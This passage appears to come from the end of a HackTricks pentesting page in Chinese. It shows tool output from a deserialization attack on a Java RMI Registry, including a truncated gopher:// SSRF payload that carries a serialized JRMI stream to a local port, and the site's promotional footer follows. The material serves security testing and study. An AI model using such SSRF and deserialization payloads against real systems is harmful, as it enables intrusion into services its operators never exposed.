[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
